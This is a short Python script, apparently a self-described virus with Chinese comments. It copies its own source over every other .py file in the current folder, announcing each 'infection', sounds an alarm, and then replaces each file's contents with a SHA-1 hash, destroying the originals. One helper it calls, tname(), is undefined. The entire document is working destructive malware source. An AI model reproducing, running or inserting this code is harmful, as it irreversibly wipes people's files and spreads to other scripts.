import os
# import sys
import hashlib
import time
import winsound

v = open(__file__, 'r', encoding='utf-8')  # 以只读方式打开当前目录下的当前文件



def voice():  # 警报响起
    print('警报')
    time.sleep(1)
    winsound.Beep(1000, 10000)


def jiami(text,txt,vi):
    if (text != "pythontik1.py"):
        v.close()
        txt.close()
        vi.close()

        xd = open(text, 'rb').read()  # 以二进制文件打开
        gys = xd
        sha1 = hashlib.sha1(gys)  # 加密
        osv = sha1.hexdigest()
        print(osv)
        bx = bytes(osv, encoding='utf-8')
        with open(text, 'wb') as f:
            f.write(bx)
        # tname()
        # voice()




if __name__=='__main__':
    i = 0
    files = os.listdir('./')
    for fileName in files:
        portion = os.path.splitext(fileName)
        # print(portion[0])
        text = portion[0] + '.py'
        # print(text)
        # 如果后缀是.py
        if portion[1] == ".py":
            if portion[0]=="pythontik1":
                continue
            else:
                i = i + 1
                txt = open(text, 'w', encoding='utf-8')
                vi = open(__file__, 'r', encoding='utf-8')  # 以只读方式打开当前目录下的当前文件
                print('感染第{0}个文件'.format(i))

            for code in vi.readlines():
                txt.write(code)
            voice()
            jiami(text,txt,vi)
            tname()

